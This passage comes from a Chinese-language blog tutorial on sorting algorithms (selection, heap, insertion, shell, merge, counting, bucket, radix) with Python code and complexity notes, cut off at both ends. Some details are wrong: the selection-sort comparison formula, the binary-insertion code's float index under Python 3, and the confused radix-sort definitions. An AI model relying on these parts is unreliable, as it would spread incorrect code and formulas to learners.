<strong>O（nlogn）</strong>，logn表示以2为底，n的对数。因为每轮比较都会平均分成2个区间，共经过趋向于n轮的比较。</p><ol start="3"><li>平均情况</li></ol><p>平均情况和最好情况的时间复杂度都为<strong>O（nlogn）</strong>，只不过平均情况的常数因子可能大一些，有关详细分析，请查阅相关资料。</p><h2 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3.选择排序"></a>3.选择排序</h2><p><strong>步骤</strong></p><ol><li>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置</li><li>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</li><li>重复第二步，直到所有元素均排序完毕。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectionSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr) - <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 记录最小数的索引</span></span><br><span class="line">        minIndex = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &lt; arr[minIndex]:</span><br><span class="line">                minIndex = j</span><br><span class="line">        <span class="comment"># i 不是最小数时，将 i 和最小数进行交换</span></span><br><span class="line">        <span class="keyword">if</span> i != minIndex:</span><br><span class="line">            arr[i], arr[minIndex] = arr[minIndex], arr[i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>在直接选择排序中，共需要进行 n-1 轮，每轮必发生一次交换，每轮需要进行 n-i 次比较 (1&lt;=i&lt;=n-1)，总的比较次数等于 </p><p>(n-1) + (n-2) + … + ( n-(n-1) ) </p><p>化简后等于 n + (n-1)(n-2)/2</p><p>由此可知，直接选择排序的时间复杂度为 O(n^2) ，空间复杂度为 O(1) 。注意到，直接选择排序在最好和最坏情况下都是 O(n^2) 。</p><p>一般地，排序算法的时间复杂度为 O(n^2)是不令人满意的排序算法，在选择排序算法的思想下，有一种选择排序算法提升了时间性能，它就是==堆排序==</p><h2 id="4-堆排序"><a href="#4-堆排序" class="headerlink" title="4.堆排序"></a>4.堆排序</h2><p><strong>简介</strong></p><p>堆排序，英文名称 Heapsort，利用二叉树（堆）这种数据结构所设计的一种排序算法，是一种对直接选择排序的一种改建算法。在逻辑结构上是按照二叉树存储结构，正是这种结构优化了选择排序的性能，在物理存储上是连续的数组存储，它利用了数组的特点快速定位指定索引的元素。</p><p><strong>堆排序的基本概念</strong></p><p>n个关键字序列 Kl，K2，…，Kn 称为堆（Heap），当且仅当该序列满足如下性质：</p><ul><li><p>Ki &lt;= K( 2i + 1 ）且 Ki &lt;= K( 2i + 2 ) ( 0≤i≤ (n/2)-1），称为小根堆。每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列</p></li><li><p>Ki &gt;= K( 2i + 1） 且 Ki &gt;= K( 2i +2 ) ( 1≤i≤ (n/2)-1）， 称为大根堆。每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列</p></li></ul><p><strong>堆排序是如何工作的</strong></p><p>以大根堆排序为例，即要得到非降序序列。</p><ol><li>先将初始文件R[0..n-1]建成一个大根堆，此堆为初始的无序区。</li><li>再将关键字最大的记录R[0]（即堆顶）和无序区的最后一个记录R[n-1]交换，由此得到新的无序区 R[0..n-2] 和有序区 R[n-1]，且满足 R[0..n-2] ≤ R[n-1]</li><li>由于交换后新的根R[0]可能违反堆性质，故应将当前无序区R[0..n-2]调整为堆。然后再次将R[0..n-2]中关键字最大的记录R[0]和该区间的最后一个记录R[n-2]交换，由此得到新的无序区R[0..n-3] 和 有序区R[n-2..n-1]，且仍满足关系R[0..n-3] ≤ R[n-2..n-1]。</li><li>重复步骤2和步骤3，直到无序区只有一个元素为止。</li></ol><p><strong>步骤</strong></p><ol><li>创建一个堆 H[0……n-1]；</li><li>把堆首（最大值）和堆尾互换；</li><li>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</li><li>重复步骤 2，直到堆的尺寸为 1。</li></ol><p><strong>例子:如何构建大根堆</strong></p><p>3,2,5,9,2</p><ol><li>待排序列的物理存储结构和逻辑存储结构的示意图如下所示，</li></ol><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xflnkj30do08hq30.jpg" alt="1.webp" style="zoom:67%;" /><ol start="2"><li><p>构建初始堆是从length/2 - 1，即从索引1处关键码等于2开始构建，2的左右孩子等于9, 2，它们三个比较后，父节点2与左孩子9交换，如下图所示：</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xf5h1j307h07ft8k.jpg" alt="2.webp" style="zoom:67%;" /></li><li><p>接下来从索引1减1等于0处，即元素3开始与其左右孩子比较，比较后父节点3与左孩子节点9交换，如下所示：</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfg03j306e07ct8k.jpg" alt="3.webp" style="zoom:67%;" /></li><li><p>因为索引等于 0 了，所以构建堆结束，得到大根堆，第一步工作结束，下面开始第二步调整堆，也就是不断地交换堆顶节点和未排序区的最后一个元素，然后再构建大根堆，下面开始这步操作，交换栈顶元素9（如上图所示）和未排序区的最后一个元素2，如下图所示，现在排序区9成为了第一个归位的，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfixnj307k086dfq.jpg" alt="4.webp" style="zoom:67%;" /></li><li><p>接下来拿掉元素9，未排序区变成了2,3,5,2，然后从堆顶2开始进行堆的再构建，比较父节点2与左右子节点3和5，父节点2和右孩子5交换位置，如下图所示，这样就再次得到了大根堆，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfj31j307w088dfp.jpg" alt="5.webp" style="zoom:67%;" /></li><li><p>再交换堆顶5和未排序区的最后一个元素2，这样5又就位了，这样未排序区变为了2,3,2，已排序区为 5,9，交换后的位置又破坏了大根堆，已经不再是大根堆了，如下图所示，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xfjxjj308608pmx1.jpg" alt="6.webp" style="zoom:67%;" /></li><li><p>所以需要再次调整，然后堆顶2和左孩子3交换，交换后的位置如下图所示，这样二叉树又重新变为了大根堆，再把堆顶3和此时最后一个元素也就是右孩子2交换，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xh9omj3086074mx0.jpg" alt="7.webp" style="zoom:67%;" /></li><li><p>接下来再构建堆，不再赘述，见下图。</p></li></ol><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xhq52j30dp0d4q2w.jpg" alt="8.webp" style="zoom: 67%;" /><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildMaxHeap</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(math.floor(len(arr)/<span class="number">2</span>),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        heapify(arr,i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heapify</span><span class="params">(arr, i)</span>:</span></span><br><span class="line">    left = <span class="number">2</span>*i+<span class="number">1</span></span><br><span class="line">    right = <span class="number">2</span>*i+<span class="number">2</span></span><br><span class="line">    largest = i</span><br><span class="line">    <span class="keyword">if</span> left &lt; arrLen <span class="keyword">and</span> arr[left] &gt; arr[largest]:</span><br><span class="line">        largest = left</span><br><span class="line">    <span class="keyword">if</span> right &lt; arrLen <span class="keyword">and</span> arr[right] &gt; arr[largest]:</span><br><span class="line">        largest = right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> largest != i:</span><br><span class="line">        swap(arr, i, largest)</span><br><span class="line">        heapify(arr, largest)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(arr, i, j)</span>:</span></span><br><span class="line">    arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heapSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> arrLen</span><br><span class="line">    arrLen = len(arr)</span><br><span class="line">    buildMaxHeap(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        swap(arr,<span class="number">0</span>,i)</span><br><span class="line">        arrLen -=<span class="number">1</span></span><br><span class="line">        heapify(arr, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>堆排序的时间，主要由建立初始堆和反复重建堆这两部分的时间开销构成，堆排序的平均时间复杂度是O(nlogn) 。堆排序是就地排序，空间复杂度为O(1）。</p><p>通过上面的例子，可以看到两个关键码2的相对位置会发生变化，所以堆排序是不稳定的排序方法。</p><p>同样是选择排序的算法，直接选择和堆选择时间差别还是不小，但是堆排序算法不大适宜数据量较少的情况，因为光构建初始堆就要进行很多次比较。</p><h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h2><p><strong>简介</strong></p><p>直接插入排序，英文名称 straight insertion sort，它是一种依次将无序区的元素在有序区内找到合适位置依次插入的算法。</p><p>想象你在打扑克的情景:-)</p><p><strong>步骤</strong></p><ol><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从无序表中取出第一个元素</li><li>在当前有序区R[0..i-1]中查找R[i]的正确插入位置 <strong>k</strong>(0≤k≤i-1)；（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</li><li>将R[k．．i-1]中的记录均后移一个位置，腾出 <strong>k</strong> 位置上的空间插入R[i]。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertionSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        preIndex = i<span class="number">-1</span></span><br><span class="line">        current = arr[i]</span><br><span class="line">        <span class="keyword">while</span> preIndex &gt;= <span class="number">0</span> <span class="keyword">and</span> arr[preIndex] &gt; current:</span><br><span class="line">            arr[preIndex+<span class="number">1</span>] = arr[preIndex]</span><br><span class="line">            preIndex-=<span class="number">1</span></span><br><span class="line">        arr[preIndex+<span class="number">1</span>] = current</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>优化代码</strong></p><p>当有序区间数据量很大时，查找数据的插入位置就会显得非常耗时，插入排序算法每次都是从有序区间查找插入位置，以此为切入点，我们可以使用二分查找法来快速确认待插入的位置，于是就有了优化版的插入排序算法，也叫<strong>二分查找插入算法</strong>或<strong>拆半插入</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binaryInsert</span><span class="params">(arr)</span>:</span></span><br><span class="line"><span class="comment"># 折半插入排序: 小-&gt;大</span></span><br><span class="line"><span class="comment"># 在直接插入排序的基础上使用了折半查找的方法 </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</span><br><span class="line">        index = arr[i]</span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        hight = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= hight:</span><br><span class="line">            mid = (low + hight) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> index &gt; arr[mid]:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hight = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># 跳出循环后 low, mid 都是一样的, hight = low - 1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, low, <span class="number">-1</span>):</span><br><span class="line">            arr[j] = arr[j - <span class="number">1</span>]</span><br><span class="line">        arr[low] = index</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>如果目标是把n个元素的序列升序排列，那么采用插入排序存在最好情况和最坏情况。</p><ul><li><p>最好情况就是，序列已经是升序排列了，在这种情况下，需要进行的比较操作需（n-1）次即可。</p></li><li><p>最坏情况就是，序列是降序排列，那么此时需要进行的比较共有n(n-1)/2次。</p></li></ul><p>插入排序从上个演示中可以看到直接插入排序是稳定的排序算法，每次找到的插入点位置定下一个规则，要么统一放在相等关键码的前面或后面。</p><p>插入排序算法平均来说时间复杂度为O(n^2），比较次数越多，插入点后的数据移动越多,特别是当数据总量庞大的时候，但是可以用链表解决数据移动的问题。</p><p>因而，插入排序不适合对于数据量比较大的排序应用。直接插入排序在n不大时，插入排序的效果会很好，但是，如果需要排序的数据量很大直接插入排序的性能大幅下降，那么有没有优化的方法呢？由此诞生了插入思想下的希尔排序。</p><h2 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4.希尔排序"></a>4.希尔排序</h2><p> <strong>简介</strong></p><p>希尔排序(shell sort)，也称<strong>缩小增量排序</strong>，是插入排序的一种更高效的改进版本。但希尔排序是非稳定排序算法。</p><p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p><ul><li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li><li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；</li></ul><p>希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p><p><strong>希尔排序的关键概念—增量序列</strong></p><p>是指在待排序序列中提取关键码所用的序号间隔.</p><p>比如初始序列包含5个元素 [3 2 5 9 2]， 如果增量序列为2，那么在一轮排序中，分为两组： [3 5 2] ，[2 9] ，在这两组中分别做直接插入排序。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xldiej30b90f3jrg.jpg" alt="shell1.webp" style="zoom:67%;" /><p><strong>步骤</strong></p><ol><li>先取一个正整数 <code>d1&lt;n</code>，把所有序号相隔d1的数组元素放一组，组内进行直接插入排序;</li></ol><ul><li>一般的初次取序列的一半为增量，以后每次减半，直到增量为1</li></ul><ol start="2"><li><p>然后取 d2&lt; d1，重复上述分组和直接插入排序操作；</p></li><li><p>直至di = 1，即所有记录放进一个组中排序为止。</p></li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    gap=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(gap &lt; len(arr)/<span class="number">3</span>):</span><br><span class="line">        gap = gap*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gap &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(gap,len(arr)):</span><br><span class="line">            temp = arr[i]</span><br><span class="line">            j = i-gap</span><br><span class="line">            <span class="keyword">while</span> j &gt;=<span class="number">0</span> <span class="keyword">and</span> arr[j] &gt; temp:</span><br><span class="line">                arr[j+gap]=arr[j]</span><br><span class="line">                j-=gap</span><br><span class="line">            arr[j+gap] = temp</span><br><span class="line">        gap = math.floor(gap/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>希尔排序的时间复杂度为 <code>O(logn * logn * n)</code>， 没有快速排序算法<code>O(n*logn)</code>快 ，因此中等大小规模表现良好，对规模非常大的数据排序不是最优选择。</p><p>但是比直接插入排序 O(n^2）复杂度算法快得多，并且希尔排序非常容易实现，算法代码短而简单。 </p><p>此外，希尔算法在最坏的情况下和平均情况下执行效率相差不是很多，与此同时快速排序在最坏 的情况下执行的效率会非常差。</p><p>专家们提倡，几乎任何排序工作在开始时都可以用希尔排序，若在实际使用中证明它不够快， 再改成快速排序这样更高级的排序算法。</p><h2 id="5-归并算法"><a href="#5-归并算法" class="headerlink" title="5.归并算法"></a>5.归并算法</h2><p><strong>简介</strong></p><p>归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>作为一种典型的分而治之思想的算法应用，将已有序的子序列合并，得到完全有序的序列.</p><p>即先使每个子序列有序，再使子序列段间有序。</p><p>归并排序的实现由两种方法：</p><ul><li>自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第 2 种方法）；</li><li>自下而上的迭代；</li></ul><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是 O(nlogn) 的时间复杂度。代价是需要额外的内存空间。</p><p><strong>算法的核心概念—二路归并</strong></p><p>若将两个有序表合并成一个有序表，称为二路归并。</p><p><strong>归并过程</strong></p><ol><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li><li>重复步骤 3 直到某一指针达到序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ol><p><strong>二路归并例子演示</strong></p><p>如下图所示，初始状态时，a序列[2,3,5]和b序列[2,9]为已排序好的子序列，现在利用二路归并，将a和b合并为有序序列 r，初始时，i指向a的第一个元素，j指向b的第一个元素，k初始值等于0。</p><p>==说明==:r中最后一个元素起到哨兵的作用，灰色显示。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xi5loj30b109j3yc.jpg" alt="merge1.webp" style="zoom:67%;" /><p>第一步，比较a[i]和b[j]，发现相等，如果规定相等时，a的先进入r，则如下图所示，i, k分别加1，为了形象化，归并后的元素不再绘制。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xhx0zj30bf0a80sk.jpg" alt="merge2.webp" style="zoom:67%;" /><p>第二步，继续比较，此时b[j]小，所以b的元素2进入r，则如下图所示，j, k分别加1，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xi05xj30av09p0sk.jpg" alt="merge3.webp" style="zoom:67%;" /><p>第三步，继续比较，此时a[i]小，所以a的元素3进入r，则如下图所示，i, k分别加1，</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xjxxlj30ar0am3yc.jpg" alt="merge4.webp" style="zoom:67%;" /><p>第四步，继续比较，此时a[i]小，所以a的元素5进入r，则如下图所示，i, k分别加1，此时序列a的3个元素已经归并完，b中还剩下一个，这个可以通过k可以看出，它还没有到达个数5。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xl4h2j30bi0aaq2r.jpg" alt="merge5.webp" style="zoom: 67%;" /><p>第五步，将序列b中的所有剩余元素直接放入r中即可，不用做任何比较了，直至b变空，二路归并结束。</p><img src="http://ww1.sinaimg.cn/large/007UR4Zcly1ga3a8xjxdwj30b80badfn.jpg" alt="merge6.webp" style="zoom:67%;" /><p><strong>步骤</strong></p><ol><li>先把待排序区间 [s,t] 以中点二分；</li><li>接着把左边子区间排序；</li><li>再把右边子区间排序；</li><li>最后把左区间和右区间用一次归并操作合并成有序的区间 [s,t] 。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mergeSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">if</span>(len(arr)&lt;<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    middle = math.floor(len(arr)/<span class="number">2</span>)</span><br><span class="line">    left, right = arr[<span class="number">0</span>:middle], arr[middle:]</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left,right)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">        <span class="keyword">if</span> left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]:</span><br><span class="line">            result.append(left.pop(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> left:</span><br><span class="line">        result.append(left.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> right:</span><br><span class="line">        result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>归并排序的时间复杂度为O(nlogn) ，因为递归每次按照一半分区，并且merge需要线性时间。最重要的是该算法中最好、最坏和平均的时间性能都是O(nlogn)。</p><p>归并排序的空间复杂度为O(n)，会占用内存。</p><p>总之，归并排序虽然比较占用内存，但却是一种效率高且稳定的算法。</p><h2 id="8-计数排序"><a href="#8-计数排序" class="headerlink" title="8.计数排序"></a>8.计数排序</h2><p><strong>简介</strong></p><p>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countingSort</span><span class="params">(arr, maxValue)</span>:</span></span><br><span class="line">    bucketLen = maxValue+<span class="number">1</span></span><br><span class="line">    bucket = [<span class="number">0</span>]*bucketLen</span><br><span class="line">    sortedIndex =<span class="number">0</span></span><br><span class="line">    arrLen = len(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(arrLen):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bucket[arr[i]]:</span><br><span class="line">            bucket[arr[i]]=<span class="number">0</span></span><br><span class="line">        bucket[arr[i]]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(bucketLen):</span><br><span class="line">        <span class="keyword">while</span> bucket[j]&gt;<span class="number">0</span>:</span><br><span class="line">            arr[sortedIndex] = j</span><br><span class="line">            sortedIndex+=<span class="number">1</span></span><br><span class="line">            bucket[j]-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h2 id="9-桶排序"><a href="#9-桶排序" class="headerlink" title="9.桶排序"></a>9.桶排序</h2><p><strong>简介</strong></p><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：</p><ol><li>在额外空间充足的情况下，尽量增大桶的数量</li><li>使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中</li></ol><p>同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。</p><p><strong>什么时候最快</strong></p><p>当输入的数据可以均匀的分配到每一个桶中。</p><p><strong>什么时候最慢</strong></p><p>当输入的数据被分配到了同一个桶中。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bucket_sort</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""桶排序"""</span></span><br><span class="line">    min_num = min(s)</span><br><span class="line">    max_num = max(s)</span><br><span class="line">    <span class="comment"># 桶的大小</span></span><br><span class="line">    bucket_range = (max_num-min_num) / len(s)</span><br><span class="line">    <span class="comment"># 桶数组</span></span><br><span class="line">    count_list = [ [] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) + <span class="number">1</span>)]</span><br><span class="line">    <span class="comment"># 向桶数组填数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        count_list[int((i-min_num)//bucket_range)].append(i)</span><br><span class="line">    s.clear()</span><br><span class="line">    <span class="comment"># 回填，这里桶内部排序直接调用了sorted</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count_list:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> sorted(i):</span><br><span class="line">            s.append(j)</span><br></pre></td></tr></table></figure><h2 id="10-基数排序"><a href="#10-基数排序" class="headerlink" title="10.基数排序"></a>10.基数排序</h2><p>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p><strong>相关概念</strong></p><ul><li>关键码位数</li></ul><p>待排序序列中最大数的位数，例如序列 [2, 10, 8, 234]，关键码为：0,1,2,3,4,8，关键码位数 d 为6 。如果关键码是数值型的那么上限为 10个。</p><ul><li>radix</li></ul><p>==关键码==(就是每个数字的个位数)的取值范围，例如序列 [2, 10, 8, 234]，按照从右数的顺序第一位d1=1时的关键码的取值为 4,8,0,2，即范围为0~8 。</p><ul><li>记录数</li></ul><p>待排序的个数</p><ul><li>桶</li></ul><p>基数排序中，桶的编号为关键码的取值。若关键码为数值型，则桶的编号为0~9，共10个不同的桶。</p><ul><li>分配</li></ul><p>将记录按照某位（比如从右往左数第1位）将记录分配到编号为0~10的桶中的过程。比如 [2, 10, 8, 234]第一次分配（第一次分配定义为按照从右往左数的第1位）后，桶0中有10，桶2中有2，桶4中有234，桶8中有8，其他桶，比如1,3,5,6,7,9桶中都没有记录。</p><ul><li>收集</li></ul><p>分配后需要对桶中的记录再串起来，这个过程叫做收集。比如，上面的序列收集后的结果为（按照从桶0到桶9的顺序收集）10, 2，234，8 。</p><p><strong>简介</strong></p><p>基数排序（<strong>radix sort</strong>），属于“分配式排序”（distribution sort）。</p><p>基数排序算法先要求计算出待排序序列的最大位数，将记录切割成不同的数字，按照最高位优先或者最低位优先的规则遍历；</p><p>每次遍历中：</p><ol><li>分配。首先要将待排序序列中的当前位上的数字找到对应的桶；</li><li>收集。分配后需要对桶中的记录再串起来，形成一个新的排序序列，供下一次分配用。</li></ol><p>直至遍历完成，得到排序好的序列。</p><ul><li><p><strong>最高位优先</strong> (Most Significant Digit first)法，简称MSD法：先按key = 1 排序分组，再对各组按k = 2 